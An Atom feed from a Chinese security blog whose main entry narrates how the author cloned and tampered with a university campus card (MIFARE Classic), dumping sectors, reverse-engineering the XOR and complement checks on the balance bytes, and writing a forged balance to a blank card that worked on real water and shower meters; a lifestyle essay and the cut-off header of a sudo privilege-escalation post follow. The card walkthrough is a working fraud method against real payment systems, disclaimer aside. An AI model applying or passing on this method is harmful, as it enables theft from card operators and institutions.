<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iceH’s Blog</title>
  
  <subtitle>分享/干货/生活</subtitle>
  <link href="http://www.secice.cn/atom.xml" rel="self"/>
  
  <link href="http://www.secice.cn/"/>
  <updated>2020-12-14T09:54:40.885Z</updated>
  <id>http://www.secice.cn/</id>
  
  <author>
    <name>iceH</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>我是如何破解学校一慧通的</title>
    <link href="http://www.secice.cn/p/c92f138d"/>
    <id>http://www.secice.cn/p/c92f138d</id>
    <published>2020-12-14T08:50:09.000Z</published>
    <updated>2020-12-14T09:54:40.885Z</updated>
    
    <content type="html"><![CDATA[<p>文章是大学的时候写的，现在毕业多年，打算将过程写出来分享下学习思路</p><div class="note note-primary">            <p>本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！</p>          </div><h2 id="一、破解打水功能"><a href="#一、破解打水功能" class="headerlink" title="一、破解打水功能"></a>一、破解打水功能</h2><p>用到的工具：</p><blockquote><p>读卡设备：ACCR122U一个</p></blockquote><blockquote><p>空白M1卡片一张</p></blockquote><blockquote><p>在用的一慧通一张 </p></blockquote><p>上图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/01.png" alt="我是如何破解学校一慧通的"></p><blockquote><p>平台：windows7</p></blockquote><blockquote><p>软件：NFCGUI-Pro.exe</p></blockquote><blockquote><p>M1卡服务程序</p></blockquote><h3 id="具体实施："><a href="#具体实施：" class="headerlink" title="具体实施："></a>具体实施：</h3><p>先去打水那查看卡内的余额：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/02.png" alt="我是如何破解学校一慧通的"></p><p>卡内余额为29.85元，然后将ACR122u插在机器上，使用M1卡服务程序破解得出卡内的DUMP文件</p><p>使用M1卡服务器程序破解：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/03.png" alt="我是如何破解学校一慧通的"></p><p>破解成功</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/04.png" alt="我是如何破解学校一慧通的"></p><p>破解了好久终于破解成功，dump文件会生成在文件目录下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/05.png" alt="我是如何破解学校一慧通的"></p><p><code>dumpfile 09d222aa (2015-11-1210_37_36) 1K.dump</code>文件就是生成的破解文件  可以看到生成的dump文件为1KB大小，但是具体写入M1卡的时候是需要写入4KB大小的dump文件的</p><p>我是可以使用NFCGUI-PRO.exe修复，</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/06.png" alt="我是如何破解学校一慧通的"></p><p>打开这个软件点击选择文件-选择刚才生成的1KB文件-就会提示“是否保存为4K文件格式”—选择“是”-就是自带修复成功</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/07.png" alt="我是如何破解学校一慧通的"></p><p>然后关闭软件，刚才的1kb的DUMP文件就会自带修复为4KB文件了。</p><p>通过上面的方法再得到两个不同金额的dump文件。</p><p>通过十六进制编辑器进行dump文件的对比，找出金额控制位，我使用winhex进行编辑dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/08.png" alt="我是如何破解学校一慧通的"></p><p>因为这三个文件都是同一张卡片不同金额的dump文件，所以假定有金额的数据不同，有刷</p><p>卡次数记录的数据不同，刷卡时间的记录不同，（假定会有这些不同之处，也许只有记录</p><p>金额的变化），通过对比两张卡片，发现在00000901有不同的数据块 </p><p><strong>如图</strong></p><p>余额为29.85：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/09.png" alt="我是如何破解学校一慧通的"></p><p>余额为29.83：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/10.png" alt="我是如何破解学校一慧通的"></p><p>余额为29.33：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/11.png" alt="我是如何破解学校一慧通的"></p><p>发现这两张卡内的不同之处在于：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/12.png" alt="我是如何破解学校一慧通的"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/13.png" alt="我是如何破解学校一慧通的"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/14.png" alt="我是如何破解学校一慧通的"></p><p>将十进制金额转换为十六进制为：</p><pre><code class="hljs basic"><span class="hljs-symbol">2985 </span>= BA9<span class="hljs-symbol">2983 </span>= BA7<span class="hljs-symbol">2933 </span>= B75</code></pre><p>可以看出</p><pre><code class="hljs mipsasm">A9 <span class="hljs-keyword">B</span><span class="hljs-keyword">A7 </span><span class="hljs-keyword">B</span><span class="hljs-keyword">75 </span><span class="hljs-keyword">B</span></code></pre><p>得出结论</p><pre><code class="hljs ini"><span class="hljs-attr">B2</span> = B<span class="hljs-attr">BC</span> = B<span class="hljs-attr">6E</span> = B</code></pre><p>当时想这个B是怎么来的，想了好久，后来发现，将两个不同的数据块进行xor运算：</p><pre><code class="hljs mipsasm">A9 <span class="hljs-keyword">xor </span><span class="hljs-keyword">B2 </span>= <span class="hljs-number">1</span>B<span class="hljs-built_in">A7</span> <span class="hljs-keyword">xor </span><span class="hljs-keyword">BC </span>= <span class="hljs-number">1</span>B<span class="hljs-number">75</span> <span class="hljs-keyword">xor </span><span class="hljs-number">6</span>E = <span class="hljs-number">1</span>B</code></pre><p><strong>xor是如何进行运算的</strong></p><p>例如：</p><pre><code class="hljs dns">A9 xor B2 = <span class="hljs-number">1</span>B将A9转换为二进制为<span class="hljs-number">10101001</span>将B2转换为二进制为<span class="hljs-number">10110010</span><span class="hljs-number">10101001</span><span class="hljs-number">10110010</span>————<span class="hljs-number">00011011</span>然后将<span class="hljs-number">00011011</span>转换成十六进制等于<span class="hljs-number">1</span>B</code></pre><p>我把金额改成40元</p><p>40转换成十六进制为：</p><p>40-4000-FA0</p><p>A0 xor ？= 1F</p><p>将A0转换为二进制为10100000</p><p>将1F转换为二进制为11111</p><p>10100000</p><p>​       ？</p><p>————</p><p>   11111</p><p>可以得出问好区域是10111111</p><p>10111111转换为十六进制为BF</p><p>直接在winhex内修改dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/15.png" alt="我是如何破解学校一慧通的"></p><p>直接保存为40.dump</p><p>通过NFCGUI-PRO.exe软件将dump文件写入到空白卡片中：</p><p><strong>如图:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/16.png" alt="我是如何破解学校一慧通的"></p><p>打开NFCGUI-PRO.exe软件后DUMP和Key文件选择加载文件40.dump</p><p>将ACR122U插入到电脑后将空白卡片放到读卡器上后选择写入文件</p><p>写入成功：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/17.png" alt="我是如何破解学校一慧通的"></p><p>当我拿去测试时，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/18.png" alt="我是如何破解学校一慧通的"></p><p>没错，读不出来……</p><p>然后我的思绪就这样断了…</p><p>我又拿水卡刷了几次后，卡内余额剩余25.90时，终于又发现了….</p><p><strong>如图：</strong></p><p>余额：29.33元</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/19.png" alt="我是如何破解学校一慧通的"></p><p>余额：25.90元</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/20.png" alt="我是如何破解学校一慧通的"></p><p>把金额转换为十六进制</p><pre><code class="hljs apache"><span class="hljs-attribute">29</span>.<span class="hljs-number">33</span>—<span class="hljs-number">2933</span>—B<span class="hljs-number">75</span><span class="hljs-attribute">25</span>.<span class="hljs-number">90</span>—<span class="hljs-number">2590</span>—A<span class="hljs-number">1</span>E</code></pre><p>这样子应该就可以看出了</p><p>40转换成十六进制为：</p><p><code>40-4000-FA0</code></p><p><font color='32CD32'>/*这些上面说过了，怕有些人看不懂我再写一下过程</font></p><p><font color='32CD32'>A0 xor ？= 1F</font></p><p><font color='32CD32'>将A0转换为二进制为10100000</font></p><p><font color='32CD32'>将1F转换为二进制为11111</font></p><p><font color='32CD32'>10100000</font></p><p><font color='32CD32'>       ？</font></p><p><font color='32CD32'>————</font></p><p><font color='32CD32'>   11111</font></p><p><font color='32CD32'>可以得出问好区域是10111111</font></p><p><font color='32CD32'>10111111转换为十六进制为BF</font></p><p><font color='32CD32'>*/</font></p><p>在winhex内修改dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/21.png" alt="我是如何破解学校一慧通的"></p><p>存为40.dump</p><p>写入我就不再继续说了</p><p>我拿卡去测试</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/22.png" alt="我是如何破解学校一慧通的"></p><p>破解成功！！！！</p><blockquote><p>改成999.99太张扬了，而且某些原因，没数据可以分析，所以我加到40就够了！</p></blockquote><h2 id="二、破解洗澡功能"><a href="#二、破解洗澡功能" class="headerlink" title="二、破解洗澡功能"></a>二、破解洗澡功能</h2><p>男寝装备落后，没有插卡机，花了我5块大洋激活洗澡功能。</p><p>经过妹子帮忙多次消费后（可惜那个妹子现在娃都会打酱油了），得出6次数据，4次自己卡中的数据，2次妹子卡中的数据。</p><p>经过对比扇区数据不同后，确定了金额的位置，</p><p>这4次是我自己的数据，如图：</p><p>3.14</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/23.png" alt="我是如何破解学校一慧通的"></p><p>3.20</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/24.png" alt="我是如何破解学校一慧通的"></p><p>4.22</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/25.png" alt="我是如何破解学校一慧通的"></p><p>5.00</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/26.png" alt="我是如何破解学校一慧通的"></p><p>这是妹子卡中的两次数据，如图:</p><p>0.16</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/27.png" alt="我是如何破解学校一慧通的"></p><p>4.78</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/28.png" alt="我是如何破解学校一慧通的"></p><p>将金额转换成十六进制为：</p><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">14</span> = <span class="hljs-number">314</span> = <span class="hljs-number">13</span>A<span class="hljs-attribute">3</span>.<span class="hljs-number">20</span> = <span class="hljs-number">320</span> = <span class="hljs-number">140</span><span class="hljs-attribute">4</span>.<span class="hljs-number">22</span> = <span class="hljs-number">422</span> = <span class="hljs-number">1</span>A<span class="hljs-number">6</span><span class="hljs-attribute">5</span>.<span class="hljs-number">00</span> = <span class="hljs-number">500</span> = <span class="hljs-number">1</span>F<span class="hljs-number">4</span><span class="hljs-attribute">0</span>.<span class="hljs-number">16</span> = <span class="hljs-number">16</span> = <span class="hljs-number">10</span><span class="hljs-attribute">4</span>.<span class="hljs-number">78</span> = <span class="hljs-number">478</span> = <span class="hljs-number">1</span>DE</code></pre><p>我卡中的数据不同的区域用红色的标记起来：</p><p><strong>3.14</strong></p><p>00 00 00 35 A0 <font color='red'>3A 01</font> 00 00 <font color='red'>C5</font> FE FF FF <font color='red'>3A 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>3A 01</font> 00 00 <font color='red'>C5</font> FE FF FF <font color='red'>3A 01</font> 00 001E</p><p><strong>3.20</strong></p><p>00 00 00 35 A0 <font color='red'>40 01</font> 00 00 <font color='red'>BF</font> FE FF FF <font color='red'>40 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>40 01</font> 00 00 <font color='red'>BF</font> FE FF FF <font color='red'>40 01</font> 00 001E</p><p><strong>4.22</strong></p><p>00 00 00 35 A0 <font color='red'>A6 01</font> 00 00 <font color='red'>59</font> FE FF FF <font color='red'>A6 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A6 01</font> 00 00 <font color='red'>59</font> FE FF FF <font color='red'>A6 01</font> 00 001E</p><p><strong>5.00</strong></p><p>00 00 00 35 A0 <font color='red'>F4 01</font> 00 00 <font color='red'>0B</font> FE FF FF <font color='red'>F4 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>F4 01</font> 00 00 <font color='red'>0B</font> FE FF FF <font color='red'>F4 01</font> 00 001E</p><p>我用3.14为例。<font color='red'>3A 01</font>区域有两处，可以看出金额3.14转换成十六进制是13A，后两位就是3A，第一位是1。这样就可以确定3A01是如何来的。</p><p>关于C5是如何来的，经过我多次分析加运算后得知</p><p><font color='Blue'>FF - 3A = C5</font> 这样一来也可以知道C5是如何得来的</p><p>我想把金额改成40元，40转换十六进制为40.00 =4000 = FA0</p><p>FF - A0 = 5F</p><p>可以得出40的数据为</p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00 1E</p><p>不过当我写进卡里时….</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/29.png" alt="我是如何破解学校一慧通的"></p><p>这是妹子拍给我的照片….</p><p>后来我对比妹子的两个数据</p><p>0.16</p><p>00 00 00 72 6A <font color='red'>10 00</font> 00 00 <font color='red'>EF</font> <font color='LimeGreen'>FF</font> FF FF <font color='red'>10 00</font> 00 00</p><p>1D E2 1D E2 <font color='red'>10 00</font> 00 00 <font color='red'>EF</font> <font color='LimeGreen'>FF</font> FF FF <font color='red'>10 00</font> 00 00 1E</p><p>4.78</p><p>00 00 00 72 6A <font color='red'>DE 01</font> 00 00 <font color='red'>21</font> <font color='LimeGreen'>FE</font> FF FF <font color='red'>DE 01</font> 00 00</p><p>1D E2 1D E2 <font color='red'>DE 01</font> 00 00 <font color='red'>21</font> <font color='LimeGreen'>FE </font>FF FF <font color='red'>DE 01</font> 00 00 1E</p><p>又有一个地方产生了变化….</p><p>0.16时为FF，4.78为FE</p><p>计算得出加密方法：</p><p>0.16为例</p><p>FF xor EF = 10</p><p>10 + 00 = 10</p><p>经过多次运算，所有金额数据都符合这个规律</p><p>继续转到40的金额 </p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F</font> FE FF FF <font color='red'>A0 0F</font> 00 001E</p><p>这是之前的数据</p><p>A0 + 0F = AF</p><p>? Xor 5F =AF</p><p>关于xor的运算之前已经说过这里就不多说了</p><p>得出结果为F0</p><p>将数据改为</p><p>00 00 00 35 A0 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F F0</font> FF FF <font color='red'>A0 0F</font> 00 00</p><p>1D E2 1D E2 <font color='red'>A0 0F</font> 00 00 <font color='red'>5F F0</font> FF FF <font color='red'>A0 0F</font> 00 00 1E</p><p>写进卡中后</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/30.png" alt="我是如何破解学校一慧通的"></p><p>成功，据说每次插进去都会少0.06，这就是传说中的吞钱？？</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>一卡通有三个功能，吃饭的功能没去研究，就这样吧。</p><p>文章写得简单，可过程经过多次测试与计算。</p><p>最后祝各位看到此文章的学子们在大学期间都能找到自己的真爱。</p><div class="note note-primary">            <p>本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！</p>          </div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文章是大学的时候写的，现在毕业多年，打算将过程写出来分享下学习思路&lt;/p&gt;
&lt;div class=&quot;note note-primary&quot;&gt;
            &lt;p&gt;本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！&lt;/p&gt;
  </summary>
      
    
    
    
    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="破解" scheme="http://www.secice.cn/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>一个人开始废掉的3个迹象</title>
    <link href="http://www.secice.cn/p/65c9d71c"/>
    <id>http://www.secice.cn/p/65c9d71c</id>
    <published>2020-12-07T02:16:37.000Z</published>
    <updated>2020-12-07T02:18:46.643Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>　　最近半年，表弟迷上了刷视频，不管什么时候见到他，他总是拿着个手机在看。我劝他：“都要找工作的人了，别一天到晚就知道刷视频，干点正事要紧。”他总是说：“马上马上，就看1分钟，再看1分钟！”</p><p>　　可问题是，1分钟常常演变成10分钟、1小时，甚至一整天。</p><p>　　我知道，网上有许多表弟感兴趣的内容，尤其系统还会根据他过去浏览的信息，有针对性地进行推送。比如表弟爱看幽默搞笑的段子，系统就会推送更多的类似视频给他。</p><p>　　但是，如果没有足够的自制力去抵御外界的诱惑，过度沉迷于即时快感，那离废掉也就不远了。</p><p>　　心理学上有一个“花盆效应”，说的是人如果在舒适的“花盆”中待久了，就容易不思进取、安于现状。</p><p>　　<strong>如果你天天禁锢在自己的小圈子里，沉溺在自己的舒适区不可自拔，而不是用心花时间提升自己，怎么可能走向更广阔的天地呢？</strong></p><p>　　人生如逆水行舟，不进则退。如果选择过分安逸，就会丧失斗志；如果丧失了斗志，生活就会越来越闲；如果越来越闲，最终就会和别人拉开一大截差距。</p><p>　　现在有多不思进取，将来被时代所抛弃时就有多后悔莫及。</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>　　前几天，我的叔叔失业了，这沉重的一击害得他整天抽烟解闷，觉得在阿姨面前抬不起头来。</p><p>　　其实，叔叔的情况，我们都早有耳闻。他自认为自己技术过硬，曾经又获得过公司的先进，就终日懒懒散散、不思进取，躺在过去的功劳簿上睡大觉。</p><p>　　半年前，公司新招聘了个名校毕业的小伙子。小伙子吃苦耐劳，肯学肯干，技术水平早就在叔叔之上。</p><p>　　叔叔也不是没有危机感，但他觉得，自己年纪大了，记性也差了，现在要学新东西也难了，常常是一边嘴里满是焦虑，一边又没有实际行动。</p><p>　　现在工作被人取代，叔叔这才后悔莫及：试想，如果自己还是当年那个技术骨干，公司会让自己说走就走吗？</p><p>　　说到底，这是他自己长期满足于现状、停止学习的代价。</p><p>　　职场是个靠价值说话的地方，你有多少价值，决定了你能站上多高的位置。但凡有所成就的人，注定终身与读书和学习形影不离。</p><p>　　<strong>只要你还在学习，人生就有无限可能。</strong></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>　　两个月前，闺蜜再一次立下誓言：暴瘦20斤。</p><p>　　闺蜜是个吃货，见到啥好东西都管不住嘴，再加上迈不开腿，所以体重跟着蹭蹭蹭直线上升。</p><p>　　我激励她：“不减下来，别来见我。”在那之后，她果然坚持跑步了一阵子。但没多久，她就又一切照旧了。</p><p>　　“你不知道，跑多了腿酸。”</p><p>　　“这是下雪天啊！会冻死的啊！”</p><p>　　“啊，这么好吃的布丁，别拦我！”</p><p>　　她总会有这样七七八八的理由。所以，如今见到她，还是老样子。</p><p>　　生活中，总有一些人嚷嚷着要实现什么样的目标，却总是不能如愿，归根结底，缺的是自律。<strong>放弃了自律，迟早有一天要为过去的偷懒买单。</strong></p><p>　　有句话说得好：自律，出众；不自律，出局。</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>　　没有人天生就是王者。</p><p>　　说到底，一个人能有怎样的人生，走在什么样的路上，是痛苦还是快乐、失败还是成功，最终取决于自己。</p><p>　　如果你的生活中，出现了不再愿意走出舒适区、停止了学习、放弃了自律这三种迹象，那就要提醒自己注意了。</p><p>　　因为，成功，属于懂得走出舒适区、积极进取的人；</p><p>　　属于坚持读书和学习的人；</p><p>　　属于能够保持高度自律的人。</p><p>　　<strong>与其怨天尤人，“望洋兴叹”，不如从现在开始，脚踏实地，不负韶华，努力成为更好的自己。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;headerlink&quot; title=&quot;1&quot;&gt;&lt;/a&gt;1&lt;/h2&gt;&lt;p&gt;　　最近半年，表弟迷上了刷视频，不管什么时候见到他，他总是拿着个手机在看。我劝他：“都要找工作的人了，别一天到晚就知道刷视频，干点正事要紧。”他总是</summary>
      
    
    
    
    <category term="胡思乱想" scheme="http://www.secice.cn/categories/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    
    
    <category term="生活" scheme="http://www.secice.cn/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之Sudo配置错误</title>
    <link href="http://www.secice.cn/p/94404766"/>
    <id>http://www.secice.cn/p/94404766</id>
    <published>2020-11-27T06:38:09.000Z</published>
    <updated>2020-12-13T11:14:58.969Z</updated>
    
